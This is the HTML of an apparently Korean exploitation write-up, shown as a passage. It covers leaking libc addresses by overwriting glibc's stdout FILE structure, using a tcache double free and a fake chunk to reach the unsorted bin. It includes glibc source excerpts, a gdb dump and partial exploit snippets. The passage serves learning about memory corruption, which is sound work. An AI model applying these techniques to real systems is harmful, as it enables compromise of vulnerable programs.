3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>_IO_new_file_xsputn 함수</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">_IO_size_t\n<span class=\"token function\">_IO_new_file_xsputn</span> <span class=\"token punctuation\">(</span>_IO_FILE <span class=\"token operator\">*</span>f<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>data<span class=\"token punctuation\">,</span> _IO_size_t n<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>do_write<span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">{</span>\n\t\tcount <span class=\"token operator\">=</span> <span class=\"token function\">new_do_write</span> <span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">,</span> do_write<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\tto_do <span class=\"token operator\">-=</span> count<span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>count <span class=\"token operator\">&lt;</span> do_write<span class=\"token punctuation\">)</span>\n\t\t    <span class=\"token keyword\">return</span> n <span class=\"token operator\">-</span> to_do<span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>new_do_write(f,s,do_write) 함수 호출</li>\n<li>fp, stdout 구조체</li>\n</ul>\n<h2 id=\"new_do_write-함수\" style=\"position:relative;\"><a href=\"#new_do_write-%ED%95%A8%EC%88%98\" aria-label=\"new_do_write 함수 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>new_do_write 함수</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">_IO_IS_APPENDING</span> <span class=\"token expression\"><span class=\"token number\">0x1000</span></span></span>\n\n<span class=\"token keyword\">static</span> size_t <span class=\"token function\">new_do_write</span> <span class=\"token punctuation\">(</span>FILE <span class=\"token operator\">*</span>fp<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>data<span class=\"token punctuation\">,</span> size_t to_do<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n  size_t count<span class=\"token punctuation\">;</span>\n  <span class=\"token comment\">// 전달 받은 파일 포인터의 _flags 멤버 변수의 값이</span>\n\t<span class=\"token comment\">//  _IO_IS_APPENDING 비트를 포함하고 있는지 확인한다.</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>fp<span class=\"token operator\">-></span>_flags <span class=\"token operator\">&amp;</span> _IO_IS_APPENDING<span class=\"token punctuation\">)</span>                              \n    fp<span class=\"token operator\">-></span>_offset <span class=\"token operator\">=</span> _IO_pos_BAD<span class=\"token punctuation\">;</span>\n\n  <span class=\"token comment\">// 전달 받은 파일 포인터의 _IO_read_end 포인터와</span>\n\t<span class=\"token comment\">// _IO_write_base 포인터가 다른지 확인한다.</span>\n  <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>fp<span class=\"token operator\">-></span>_IO_read_end <span class=\"token operator\">!=</span> fp<span class=\"token operator\">-></span>_IO_write_base<span class=\"token punctuation\">)</span>                  \n    <span class=\"token punctuation\">{</span>\n      off64_t new_pos\n\t<span class=\"token operator\">=</span> <span class=\"token function\">_IO_SYSSEEK</span> <span class=\"token punctuation\">(</span>fp<span class=\"token punctuation\">,</span> fp<span class=\"token operator\">-></span>_IO_write_base <span class=\"token operator\">-</span> fp<span class=\"token operator\">-></span>_IO_read_end<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>new_pos <span class=\"token operator\">==</span> _IO_pos_BAD<span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n      fp<span class=\"token operator\">-></span>_offset <span class=\"token operator\">=</span> new_pos<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token comment\">// 만약 line 8의 조건에서 값이 같다면</span>\n<span class=\"token comment\">//  _IO_SYSWRITE 함수를 통해 new_do_write 함수의 인자인 data를 to_do의 크기만큼 출력한다.</span>\n  count <span class=\"token operator\">=</span> <span class=\"token function\">_IO_SYSWRITE</span> <span class=\"token punctuation\">(</span>fp<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">,</span> to_do<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   \n                      \n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>fp<span class=\"token operator\">-></span>_cur_column <span class=\"token operator\">&amp;&amp;</span> count<span class=\"token punctuation\">)</span>\n    fp<span class=\"token operator\">-></span>_cur_column <span class=\"token operator\">=</span> <span class=\"token function\">_IO_adjust_column</span> <span class=\"token punctuation\">(</span>fp<span class=\"token operator\">-></span>_cur_column <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">,</span> count<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">_IO_setg</span> <span class=\"token punctuation\">(</span>fp<span class=\"token punctuation\">,</span> fp<span class=\"token operator\">-></span>_IO_buf_base<span class=\"token punctuation\">,</span> fp<span class=\"token operator\">-></span>_IO_buf_base<span class=\"token punctuation\">,</span> fp<span class=\"token operator\">-></span>_IO_buf_base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  fp<span class=\"token operator\">-></span>_IO_write_base <span class=\"token operator\">=</span> fp<span class=\"token operator\">-></span>_IO_write_ptr <span class=\"token operator\">=</span> fp<span class=\"token operator\">-></span>_IO_buf_base<span class=\"token punctuation\">;</span>\n  fp<span class=\"token operator\">-></span>_IO_write_end <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>fp<span class=\"token operator\">-></span>_mode <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span>\n\t\t       <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span>fp<span class=\"token operator\">-></span>_flags <span class=\"token operator\">&amp;</span> <span class=\"token punctuation\">(</span>_IO_LINE_BUF <span class=\"token operator\">|</span> _IO_UNBUFFERED<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\t       <span class=\"token operator\">?</span> fp<span class=\"token operator\">-></span>_IO_buf_base <span class=\"token operator\">:</span> fp<span class=\"token operator\">-></span>_IO_buf_end<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> count<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>stdout→flags 에 <code class=\"language-text\">_IO_IS_APPENDING</code> 이 포함되어 있어야 한다.</li>\n<li>_IO_new_do_write, _IO_SYSWRITE를 통해 _IO_write_base를 출력한다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">count <span class=\"token operator\">=</span> <span class=\"token function\">_IO_SYSWRITE</span> <span class=\"token punctuation\">(</span>fp<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">,</span> to_do<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token operator\">--</span><span class=\"token operator\">></span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token function\">_IO_sputn</span> <span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> hp<span class=\"token operator\">-></span>_IO_write_base<span class=\"token punctuation\">,</span> to_flush<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> to_flush<span class=\"token punctuation\">)</span>\n\tresult <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></code></pre></div>\n<h2 id=\"how-to-exploit-using-stdout\" style=\"position:relative;\"><a href=\"#how-to-exploit-using-stdout\" aria-label=\"how to exploit using stdout permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>How to exploit using stdout</h2>\n<ul>\n<li>flags, _IO_write_base를 조작 한다.</li>\n<li>_IO_write_base를 하위 바이트만 조작하여 라이브러리 줏소가 위치한 주소를 가리키게 하여 라이브러리 주소를 출력할 수 있다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">gdb<span class=\"token operator\">-</span>peda$ p <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_IO_FILE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token constant\">stdout</span>\n$<span class=\"token number\">5</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n  _flags <span class=\"token operator\">=</span> <span class=\"token number\">0xfbad2887</span><span class=\"token punctuation\">,</span> \n  _IO_read_ptr <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7dd07e3</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">131</span><span class=\"token operator\">></span> <span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">,</span> \n  _IO_read_end <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7dd07e3</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">131</span><span class=\"token operator\">></span> <span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">,</span> \n  _IO_read_base <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7dd07e3</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">131</span><span class=\"token operator\">></span> <span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">,</span> \n  _IO_write_base <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7dd07e3</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">131</span><span class=\"token operator\">></span> <span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">,</span> \n  _IO_write_ptr <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7dd07e3</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">131</span><span class=\"token operator\">></span> <span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">,</span> \n  _IO_write_end <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7dd07e3</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">131</span><span class=\"token operator\">></span> <span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">,</span> \n  _IO_buf_base <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7dd07e3</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">131</span><span class=\"token operator\">></span> <span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">,</span> \n  _IO_buf_end <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7dd07e4</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">132</span><span class=\"token operator\">></span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span> \n  _IO_save_base <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> \n  _IO_backup_base <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> \n  _IO_save_end <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> \n  _markers <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> \n  _chain <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7dcfa00</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdin_<span class=\"token operator\">></span><span class=\"token punctuation\">,</span> \n  _fileno <span class=\"token operator\">=</span> <span class=\"token number\">0x1</span><span class=\"token punctuation\">,</span> \n  _flags2 <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> \n  _old_offset <span class=\"token operator\">=</span> <span class=\"token number\">0xffffffffffffffff</span><span class=\"token punctuation\">,</span> \n  _cur_column <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> \n  _vtable_offset <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> \n  _shortbuf <span class=\"token operator\">=</span> <span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">,</span> \n  _lock <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7dd18c0</span> <span class=\"token operator\">&lt;</span>_IO_stdfile_1_lock<span class=\"token operator\">></span><span class=\"token punctuation\">,</span> \n  _offset <span class=\"token operator\">=</span> <span class=\"token number\">0xffffffffffffffff</span><span class=\"token punctuation\">,</span> \n  _codecvt <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> \n  _wide_data <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7dcf8c0</span> <span class=\"token operator\">&lt;</span>_IO_wide_data_1<span class=\"token operator\">></span><span class=\"token punctuation\">,</span> \n  _freeres_list <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> \n  _freeres_buf <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> \n  __pad5 <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> \n  _mode <span class=\"token operator\">=</span> <span class=\"token number\">0xffffffff</span><span class=\"token punctuation\">,</span> \n  _unused2 <span class=\"token operator\">=</span> <span class=\"token string\">'\\000'</span> <span class=\"token operator\">&lt;</span>repeats <span class=\"token number\">19</span> times<span class=\"token operator\">></span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>해당 구조체를 덮어쓰기 위해서는 라이브러리 주소를 이용해야 한다.</li>\n<li>main_arena 영역 주소가 힙 청크에 남아야 하며 그렇게 하기 위해서는 unsorted bin을 이용해야 한다.</li>\n</ul>\n<h2 id=\"double-free-bug\" style=\"position:relative;\"><a href=\"#double-free-bug\" aria-label=\"double free bug permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Double Free Bug</h2>\n<ul>\n<li>Double Free Bug가 발생하면 같은 포인터를 두 번 가리키며 새로 할당해 값을 쓰게 된다면 ForwarD PTR를 덮을 수 있다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">40</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"AAAA\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">double</span> <span class=\"token expression\">free test</span></span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    \n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">40</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"BBBB\"</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 67.22222222222223%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB20lEQVQoz32Qi46iUAyGfY2dkQNyO9wGkNsBHBEVFFQEwRtjRHF1J/v+L7BRJ9nERJM/TZP269+2sZiE8Tj2/KFlOzrSAMUSDOt4bts0MJIFFFR1xH2ogmLodsf1PILmMRIatsNJakMLVNMV7JmljC3t0xJVUUO8anAa4lmRBxTXJCFGQpyGgILNFovTHE5z97mN97HTlD5+dfS3oQWUPqAEjISAumKAuvYRDI8zP8k1v8F3NbDIxmUJ9ExshAjVJ2ieYOC9dodfqNEMEZDEt672HiBc6QNGxiihxUISQorn7p5PYVwWaSgLotmWPlltAHUk2UgxRUHmTMTSkCMorkVzxE2P8MARkCrFw/48HEaLkdYbsHqvpXQZQTMYEUFRg2L7FmVWAA9wuljmy20wmaWbTVkdt9VZ1m3D6Zb7Y1nVcZLhFCToH/NH52m+SpdlP5wkxaas6l190SzHdL3d8bw7nqdZgVPw6c1Jvs5WpR9O5qvt7nCqzt//4foyz1evHjbNlvNi64dxkq/L6rirL23LNtxueajLw2m2KHD6uXO63Obrr8F4mq3LfX0+XP7qlmt1evvTn/3v77RYv1rbCyI/iC3X88M4mqVxWkiqIesoSrIoWfSC0Yu1/wFrcZlBwWN9FQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./4.png\"\n        title=\"./4.png\"\n        src=\"/static/086826f90fba136c03d4bc31a9fe97f5/37523/4.png\"\n        srcset=\"/static/086826f90fba136c03d4bc31a9fe97f5/e9ff0/4.png 180w,\n/static/086826f90fba136c03d4bc31a9fe97f5/f21e7/4.png 360w,\n/static/086826f90fba136c03d4bc31a9fe97f5/37523/4.png 720w,\n/static/086826f90fba136c03d4bc31a9fe97f5/ee455/4.png 863w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>FD 위치의 주소 값이 변경되어 4바이트의 0x42가 들어 가 tcache영역을 확인하게 되면 다음 주소 값이 변경된 것을 확인할 수 있겠다.</li>\n</ul>\n<h2 id=\"fake-chunk-구성\" style=\"position:relative;\"><a href=\"#fake-chunk-%EA%B5%AC%EC%84%B1\" aria-label=\"fake chunk 구성 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Fake chunk 구성</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">fake</span> <span class=\"token expression\">chunk</span></span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token function\">p64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xd1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"AAAA\"</span><span class=\"token punctuation\">)</span></code></pre></div>\n<ul>\n<li>unsorted bin을 구성하기 위해서는 tcache를 사용하지 않게끔 7개의 bin을 꽉 채워야 하며 <code class=\"language-text\">0x78</code> 크기 까지 할당할 수 있기 때문에 <code class=\"language-text\">0x410</code> 초과의 크기만큼 할당한후 해제하여 unsorted bin으로 만드는 것은 불가능하다.</li>\n<li>Fake Chunk를 해제해 main_arena 영역의 주소를 써야 하며 Fake Chunk를 해제하기 위해서는 인접한 청크가 존재해야 한다.</li>\n<li>0x555555757260 + 0xd0 주소에 힙 청크가 존재해야 한다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 469px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 81.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAIAAACZeshMAAAACXBIWXMAAAsTAAALEwEAmpwYAAADAklEQVQoz0WT227cRBzG/QogVYqAIOWCCiEqkdIqTbzZXcdnj8/2jD3nGXvX2e6mm6VpqBoJcZC4gSskLvocIF6ASyTeCXkb1Af46Zvv983fiKZWOLXDJ5P5xAnsuLLxWt9cdd9u1Mu1erXi19GsfPrF1DlNmkThVOFMt4kiRR9OciMpWzQM8rc7+ctr/OtNuur75Yvlejest93ldrO7TUt09PDLmRMtnn+z2uwur14O691me1sQZkRhXu6G23/fvvn797t/3mZ3qyJDkAqEadUwKvT53H5wcHj8zKyYQIJDoWousNQhRUZcwLyhfgNdBGdFapGaXa35dsNfPG8uB3m9sYv0068emTDFm7W4XvPdFdtu9M0uQLURF3UOSV42Wdl4QXzu+GS5pMuB9F2OWaP01PU+/uzhE3MKicJcYdE1VGDeOT7YJyOalgjk6MKLzmZOw1TDFOYSMSX65cz2Pnjw0fGJCbluhWxF1zBF9SKIUwPkdQ5xUkCQQ9sH5txtuWqFxkIhppjuPZA+Pjkz505FBBaq5brhknXLMB1to6plWdXGBfSixLRcLDssOyJ1wzXTfVrCV6/f2AEoiSBSY9m1XLF+iEa4gCUiWYXiAnlReg+Le1j0g+1H333/48lkXlM1Jos9/C45qlDesqTGoKjHznOn5aoZxaiGjY+vW/LHn39FaVkRyXRP9YLITi5XICsMYLnACYDluj4I09K03BpzxBSiosKiZbJqyQ8//fxsMp86oR2AiyC+8CM3Sk+nlhHPndj2c8v1gjjKqnPbq1qGmKwxLVrWCmWH4MODTz5/dGz5wA6APcLABXsY1G2BRQpJUrV2AM5mztjqXWem5WKYOf7B4dFTc4bVgnc97waqF2pYx0VpxDnMIUlLFJeND1Jz7ux36ojQaC/McoODw6OvT88hHcfH74VlRlyisqF729ANk4nlYtHdw0yJxXsY8dHf//B+qjArsxrH+fhJ3DA5nV5AKsbDoLzCnKhuZnsHh0ePT8wKc0Q5pLImHMvOB8l/gQk8tL132WgAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./4_1.png\"\n        title=\"./4_1.png\"\n        src=\"/static/2942358e137802a86bff75bb0928b56a/5f759/4_1.png\"\n        srcset=\"/static/2942358e137802a86bff75bb0928b56a/e9ff0/4_1.png 180w,\n/static/2942358e137802a86bff75bb0928b56a/f21e7/4_1.png 360w,\n/static/2942358e137802a86bff75bb0928b56a/5f759/4_1.png 469w\"\n        sizes=\"(max-width: 469px) 100vw, 469px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">for</span> i in <span class=\"token function\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\n    <span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x78</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"AAAA\"</span><span class=\"token punctuation\">)</span></code></pre></div>\n<ul>\n<li>0x555555757260+0xd0 주소에 청크가 존재해야 하며 해제할 시 정상적으로 해제가 가능하지만 아직 해제는 불가능 하다 정상적으로 할당된 청크가 아니기 때문이다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 471px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 34.44444444444444%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAAsTAAALEwEAmpwYAAABZ0lEQVQY0y3N626bMABAYd5imbRMTf9sUjfRpjSkSdM2EC4JYMB3x8bYxsmmvf8DTJ32AOd8Qb58yqK4fFzt3g5HAJ/f0qrHAPG6Q6eOtJjnFfj+I7z9dvfzMQ6jOIzWYRTfPz3fhVHQIAaZ6jAHmB/KapcU0npp/VkbgDmVw8t7+unLzTLecj0p5wd3lcab658W0aCBtKey6Und08OxftnnYrRcW6ENOY/K+fesnM0XD6sNkYYPo9COD0baC0AkqHrcEdF0pO5JUlTbfca1ZYMR2lBl9HRJ8uNsvrhfbZDUfBj5YKkapfUNxAGAFDIFIGsgy/7Ljmt7Hi1VVk/XpPiIH+INUR9HMTo2GOX+yS1miA8tYg3i2anZpYWyF2m8shPXk7n8TovTbL5YxlumnTJOGi9Gp/2vjrCgqNuqxWXdFXX/muTr1xQy2bMzYqIlgkq9S7LPX2/DaA2wgFRAJjvCW8z3WfkX2oSAkw6WmVAAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./5.png\"\n        title=\"./5.png\"\n        src=\"/static/5864bba5e66045b88f0ec3e916611759/1f09d/5.png\"\n        srcset=\"/static/5864bba5e66045b88f0ec3e916611759/e9ff0/5.png 180w,\n/static/5864bba5e66045b88f0ec3e916611759/f21e7/5.png 360w,\n/static/5864bba5e66045b88f0ec3e916611759/1f09d/5.png 